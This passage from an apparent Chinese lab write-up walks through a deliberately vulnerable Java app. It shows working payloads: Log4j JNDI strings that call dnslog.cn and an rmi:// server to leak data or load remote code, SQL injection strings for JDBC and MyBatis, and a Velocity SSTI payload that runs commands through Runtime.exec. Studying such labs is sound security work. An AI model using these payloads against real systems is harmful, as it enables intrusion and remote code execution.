class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;);</span><br></code></pre></td></tr></table></figure><p>如果服务器不严格校验 <code>callback</code> 参数来源，就可能造成 <strong>跨站数据泄露（XSS）</strong> 或 <strong>信息泄露漏洞</strong>。</p></blockquote><p><strong>漏洞利用：</strong></p><p>搜关键字：<code>AbstractJsonpResponseBodyAdvice</code> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ControllerAdvice</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Object2Jsonp</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractJsonpResponseBodyAdvice</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String[] callbacks;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Logger logger= LoggerFactory.getLogger(<span class="hljs-built_in">this</span>.getClass());<br><br><br>    <span class="hljs-comment">// method of using @Value in constructor</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Object2Jsonp</span><span class="hljs-params">(<span class="hljs-meta">@Value(&quot;$&#123;joychou.security.jsonp.callback&#125;&quot;)</span> String[] callbacks)</span> &#123;<br>        <span class="hljs-built_in">super</span>(callbacks);  <span class="hljs-comment">// Can set multiple paramNames</span><br>        <span class="hljs-built_in">this</span>.callbacks = callbac<br></code></pre></td></tr></table></figure><h2 id="Log4j"><a href="#Log4j" class="headerlink" title="Log4j"></a>Log4j</h2><p>版本存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938586.png" alt="20250725135906016"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-meta">@RequestMapping(value = &quot;/log4j&quot;)</span><br><span class="hljs-comment">//使用 logger.error(token) 将用户输入写入日志。如果 Log4j 使用的是受影响版本，这里的 $&#123;jndi:ldap://...&#125; 将被解析执行，触发远程加载类，导致 RCE</span><br>   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">log4j</span><span class="hljs-params">(String token)</span> &#123;<br>       logger.error(token);<br>       <span class="hljs-keyword">return</span> token;<br>   &#125;<br></code></pre></td></tr></table></figure><p>POC1:</p><p><code>/log4j?token=${jndi:ldap://${env:OS}.44wodg.dnslog.cn}</code></p><p><strong>直接访问会对非法字符过滤，需要 url 编码后注入</strong></p><p><code>/log4j?token=%24%7Bjndi%3Aldap%3A%2F%2F%24%7Benv%3AOS%7D.44wodg.dnslog.cn%7D</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938049.png" alt="20250725141100248"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080938015.png" alt="20250725141125185"></p><p>POC2:</p><p><code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot;</code></p><p><code>rmi://169.254.39.1:1099/ihe2v1</code></p><p><code>${jndi:rmi://169.254.39.1:1099/ihe2v1}</code></p><p><code>/log4j?token=${jndi:rmi://169.254.39.1:1099/ihe2v1}</code></p><p><code>url 编码：/log4j?token=%24%7Bjndi%3Armi%3A%2F%2F169.254.39.1%3A1099%2Fihe2v1%7D</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939169.png" alt="20250725141328166"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939335.png" alt="20250725141333552"></p><h2 id="PathTraversal"><a href="#PathTraversal" class="headerlink" title="PathTraversal"></a>PathTraversal</h2><p>没有对文件路径做任何过滤，攻击者可以访问任意文件</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939585.png" alt="20250725142845129"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080939910.png" alt="20250725142909337"></p><h2 id="SQLI"><a href="#SQLI" class="headerlink" title="SQLI"></a>SQLI</h2><h3 id="1-jdbc-vuln"><a href="#1-jdbc-vuln" class="headerlink" title="1.&#x2F;jdbc&#x2F;vuln"></a>1.&#x2F;jdbc&#x2F;vuln</h3><p>注入点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_sqli_vul</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>    ...<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>url:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/sqli/</span>jdbc/vuln?username=joycho<span class="hljs-string">u&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940681.png" alt="20250725132643238"></p><h3 id="2-jdbc-sec"><a href="#2-jdbc-sec" class="headerlink" title="2.&#x2F;jdbc&#x2F;sec"></a>2.&#x2F;jdbc&#x2F;sec</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/sec&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_sqli_sec</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>...<br>    <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = ?&quot;</span>;<br>    ...<br>&#125;    <br></code></pre></td></tr></table></figure><p>采用预编译，自动进行了转义，安全</p><h3 id="3-jdbc-ps-vuln"><a href="#3-jdbc-ps-vuln" class="headerlink" title="3.&#x2F;jdbc&#x2F;ps&#x2F;vuln"></a>3.&#x2F;jdbc&#x2F;ps&#x2F;vuln</h3><blockquote><p><code>PreparedStatement</code> 是 Java JDBC 提供的 <strong>预编译 SQL 语句执行器</strong>，用于安全执行 SQL 查询，<strong>防止 SQL 注入</strong>。</p><p><code>PreparedStatement</code> 是 <code>java.sql</code> 包中的一个接口，继承自 <code>Statement</code>。与普通的 <code>Statement</code> 相比，它可以使用 <code>?</code> 占位符来动态绑定参数，而不是直接拼接 SQL 字符串。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/jdbc/ps/vuln&quot;)</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">jdbc_ps_vuln</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>...<br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;select * from users where username = &#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;&quot;</span>;<br>    <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql);<br>...<br>&#125;<br></code></pre></td></tr></table></figure><p>错误使用 PreparedStatement , 虽然用的是 <code>PreparedStatement</code>，但 SQL 已拼接完成，还是有注入风险。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 正确使用范式 </span><br><span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>;<br><span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> con.prepareStatement(sql); <br>st.setString(<span class="hljs-number">1</span>,  username);  <span class="hljs-comment">// 参数绑定 </span><br></code></pre></td></tr></table></figure><p>url:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">8081</span><span class="hljs-regexp">/sqli/</span>jdbc<span class="hljs-regexp">/ps/</span>vuln?username=joycho<span class="hljs-string">u&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940290.png" alt="20250725133408711"></p><h3 id="4-mybatis-vuln01"><a href="#4-mybatis-vuln01" class="headerlink" title="4.&#x2F;mybatis&#x2F;vuln01"></a>4.&#x2F;mybatis&#x2F;vuln01</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/vuln01&quot;)</span><br>   <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>       <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln01(username);<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select * from users where username = &#x27;$&#123;username&#125;&#x27;&quot;)</span><br>List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln01</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/sqli/my</span>batis/vuln01?username=admin<span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>返回数据库中所有用户</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940609.png" alt="20250725134006587"></p><h3 id="5-mybatis-vuln02"><a href="#5-mybatis-vuln02" class="headerlink" title="5.&#x2F;mybatis&#x2F;vuln02"></a>5.&#x2F;mybatis&#x2F;vuln02</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/vuln02&quot;)</span><br>    <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln02</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>        <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln02(username);<br>    &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln02</span><span class="hljs-params">(String username)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln02&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>        select * from users where username like &#x27;%$&#123;_parameter&#125;%&#x27;<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML 配置中拼接 like + <code>${}</code></p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">/sqli/mybatis/vuln02?username=<span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br>-&gt;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%&#x27;</span> OR <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940734.png" alt="20250725134316209"></p><h3 id="6-mybatis-orderby-vuln03"><a href="#6-mybatis-orderby-vuln03" class="headerlink" title="6.&#x2F;mybatis&#x2F;orderby&#x2F;vuln03"></a>6.&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/orderby/vuln03&quot;)</span><br>   <span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisVuln03</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span> &#123;<br>       <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln03(sort);<br>   &#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln03</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;order&quot;)</span> String order)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln03&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>       select * from users<br>       <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;order != null&quot;</span>&gt;</span><br>           order by $&#123;order&#125; asc<br>       <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ORDER BY 拼接排序字段</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/sqli/mybatis/orderby/vuln03?sort=id <span class="hljs-keyword">desc</span><span class="hljs-comment">--+</span><br>-&gt;<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id <span class="hljs-keyword">desc</span><span class="hljs-comment">--+ asc</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080940380.png" alt="20250725134556658"></p><h3 id="7-mybatis-sec01"><a href="#7-mybatis-sec01" class="headerlink" title="7.&#x2F;mybatis&#x2F;sec01"></a>7.&#x2F;mybatis&#x2F;sec01</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec01&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec01</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findByUserName(username);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Select(&quot;select * from users where username = #&#123;username&#125;&quot;)</span><br>User <span class="hljs-title function_">findByUserName</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;username&quot;)</span> String username)</span>;<br></code></pre></td></tr></table></figure><h3 id="8-mybatis-sec02"><a href="#8-mybatis-sec02" class="headerlink" title="8.&#x2F;mybatis&#x2F;sec02"></a>8.&#x2F;mybatis&#x2F;sec02</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec02&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec02</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;id&quot;)</span> Integer id)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findById(id);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">User <span class="hljs-title function_">findById</span><span class="hljs-params">(Integer id)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findById&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users where id = #&#123;id&#125;<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="9-mybatis-sec03"><a href="#9-mybatis-sec03" class="headerlink" title="9.&#x2F;mybatis&#x2F;sec03"></a>9.&#x2F;mybatis&#x2F;sec03</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/sec03&quot;)</span><br><span class="hljs-keyword">public</span> User <span class="hljs-title function_">mybatisSec03</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.OrderByUsername();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">User <span class="hljs-title function_">OrderByUsername</span><span class="hljs-params">()</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;OrderByUsername&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users order by id asc limit 1<br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="10-mybatis-orderby-sec04"><a href="#10-mybatis-orderby-sec04" class="headerlink" title="10.&#x2F;mybatis&#x2F;orderby&#x2F;sec04"></a>10.&#x2F;mybatis&#x2F;orderby&#x2F;sec04</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@GetMapping(&quot;/mybatis/orderby/sec04&quot;)</span><br><span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">mybatisOrderBySec04</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;sort&quot;)</span> String sort)</span> &#123;<br>    <span class="hljs-keyword">return</span> userMapper.findByUserNameVuln03(SecurityUtil.sqlFilter(sort));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;User&gt; <span class="hljs-title function_">findByUserNameVuln03</span><span class="hljs-params">(<span class="hljs-meta">@Param(&quot;order&quot;)</span> String order)</span>;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;findByUserNameVuln03&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;String&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;User&quot;</span>&gt;</span><br>    select * from users<br>    <span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;order != null&quot;</span>&gt;</span><br>        order by $&#123;order&#125; asc<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>SSTI（Server-Side Template Injection）就是服务器端模板注入</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941162.png" alt="20250726105655246"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-meta">@GetMapping(&quot;/velocity&quot;)</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">velocity</span><span class="hljs-params">(String template)</span> &#123;<br>       Velocity.init();<br><br>       <span class="hljs-type">VelocityContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VelocityContext</span>();<br><br>       context.put(<span class="hljs-string">&quot;author&quot;</span>, <span class="hljs-string">&quot;Elliot A.&quot;</span>);<br>       context.put(<span class="hljs-string">&quot;address&quot;</span>, <span class="hljs-string">&quot;217 E Broadway&quot;</span>);<br>       context.put(<span class="hljs-string">&quot;phone&quot;</span>, <span class="hljs-string">&quot;555-1337&quot;</span>);<br><br>       <span class="hljs-comment">//对用户传入的 template 无过滤直接传入 Velocity.evaluate 执行，</span><br>       <span class="hljs-type">StringWriter</span> <span class="hljs-variable">swOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>();<br>       Velocity.evaluate(context, swOut, <span class="hljs-string">&quot;test&quot;</span>, template);<br>   &#125;<br></code></pre></td></tr></table></figure><p><strong>漏洞利用：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/ssti/velocity?template=#set($e=<span class="hljs-string">&quot;e&quot;</span>);$e.getClass().forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>,null).invoke(null,null).exec(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br><br><span class="hljs-attribute">http</span>://<span class="hljs-number">127.0.0.1:8081</span>/ssti/velocity?template=%<span class="hljs-number">23</span>set($e=%<span class="hljs-number">22</span>e%<span class="hljs-number">22</span>);$e.getClass().forName(%<span class="hljs-number">22</span>java.lang.Runtime%<span class="hljs-number">22</span>).getMethod(%<span class="hljs-number">22</span>getRuntime%<span class="hljs-number">22</span>,null).invoke(null,null).exec(%<span class="hljs-number">22</span>calc.exe%<span class="hljs-number">22</span>)<br><br></code></pre></td></tr></table></figure><ol><li><code>#set($e=&quot;e&quot;)</code></li></ol><p>Velocity 模板语言中的变量定义。创建一个变量 <code>$e</code>，值为字符串 <code>&quot;e&quot;</code>。后面我们会用 <code>$e.getClass()</code> 来获取它的 <code>Class</code> 对象，从而进入 Java 反射</p><ol start="2"><li><code>$e.getClass()</code></li></ol><p><code>$e</code> 是字符串 <code>&quot;e&quot;</code>，调用 <code>.getClass()</code> 得到的是：</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">java.lang.<span class="hljs-type">String</span>.<span class="hljs-keyword">class</span><br></code></pre></td></tr></table></figure><p>得到了 <code>Class&lt;java.lang.String&gt;</code>，可以调用其 <code>forName()</code> 静态方法</p><ol start="3"><li><code>.forName(&quot;java.lang.Runtime&quot;)</code></li></ol><p>通过反射加载 <code>java.lang.Runtime</code> 类：</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Class</span>.forName(<span class="hljs-string">&quot;java.lang.Runtime&quot;</span>)<br></code></pre></td></tr></table></figure><p>返回 <code>java.lang.Runtime.class</code>，可以继续调用它的方法</p><ol start="4"><li><code>.getMethod(&quot;getRuntime&quot;, null)</code></li></ol><p>获取 <code>Runtime</code> 类的静态方法 <code>getRuntime()</code>：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span>.<span class="hljs-keyword">class</span>.getMethod(<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>)<br></code></pre></td></tr></table></figure><p><code>getMethod()</code> 返回一个 <code>Method</code> 对象，准备执行它</p><ol start="5"><li><code>.invoke(null, null)</code></li></ol><p>执行静态方法 <code>getRuntime()</code>：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Runtime</span>.getRuntime()<br></code></pre></td></tr></table></figure><p>得到了当前 JVM 的 <code>Runtime</code> 实例，具备执行命令的能力</p><ol start="6"><li><code>.exec(&quot;calc.exe&quot;)</code></li></ol><p>最终执行命令：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>)<br></code></pre></td></tr></table></figure><p>在 Windows 上，打开计算器</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080941658.png" alt="20250726105045484"></p><h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><blockquote><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。</p><p>一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。</p><p><img 